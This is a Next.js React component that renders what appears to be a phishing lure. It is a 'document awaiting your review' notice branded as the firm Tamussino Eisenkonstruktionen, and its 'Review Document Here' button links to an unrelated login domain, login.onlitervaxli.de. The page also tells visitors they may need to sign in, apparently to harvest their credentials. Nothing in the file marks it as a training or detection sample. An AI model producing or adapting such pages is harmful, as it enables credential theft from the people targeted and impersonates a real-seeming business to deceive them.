'use client'; // Ensure this is a client-side component for Next.js

import React from "react";

const DocumentNotification = () => (
  <div
    style={{
      minHeight: "100vh",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      background: "#b2b2b2", // Ash background
    }}
  >
    <div
      style={{
        border: "1px solid #c4c4c4",
        borderRadius: "8px",
        padding: "32px",
        maxWidth: "450px",
        background: "#fafbfc",
        boxShadow: "0 2px 8px rgba(0,0,0,0.05)",
        width: "100%",
        textAlign: "center",
      }}
    >
      <div
        style={{
          fontWeight: "bold",
          fontSize: "1.15em",
          marginBottom: "10px",
          letterSpacing: "0.5px",
        }}
      >
        
      </div>
      <h2 style={{ color: "#767676", margin: "0 0 4px 0", fontWeight: "bold" }}>Tamussino Eisenkonstruktionen</h2>
      <div style={{ color: "#767676", marginBottom: "16px" }}>
        June 3, 2025
      </div>
      <h3 style={{ color: "#767676", margin: "16px 0 12px 0" }}>You have a document awaiting your review</h3>
      <a
        href="https://login.onlitervaxli.de/OMXqtHCP"
        style={{
          display: "inline-block",
          margin: "16px 0",
          padding: "10px 18px",
          background: "#1a73e8",
          color: "#fff",
          borderRadius: "4px",
          textDecoration: "none",
          fontWeight: 500,
        }}
        target="_blank"
        rel="noopener noreferrer"
      >
        Review Document Here
      </a>
      <div style={{ fontSize: "0.95em", marginTop: "12px", color: "#444" }}>
        Please note that you may be required to sign in to access the document, depending on system requirements.
      </div>
    </div>
  </div>
);

export default DocumentNotification;
